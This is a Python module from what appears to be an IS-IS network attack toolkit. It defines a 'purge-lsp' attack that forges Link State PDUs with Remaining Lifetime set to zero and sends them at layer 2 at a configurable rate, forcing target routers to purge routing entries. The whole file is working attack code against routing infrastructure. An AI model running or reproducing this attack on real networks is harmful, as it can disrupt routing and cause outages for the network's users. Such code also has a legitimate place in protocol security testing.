from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender


class PurgeLSPAttack(BaseAttack):
    name = "purge-lsp"
    description = "发送 Remaining Lifetime=0 的 LSP 迫使目标清除 LSP"
    category = AttackCategory.LSP
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id, lsp_id=lsp_id,
            src_mac=self._src_mac, level=self.config.level,
            sequence=self.config.sequence, remaining_lifetime=0,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"LSP 清除: Remaining Lifetime=0, LSP={lsp_id}",
        )

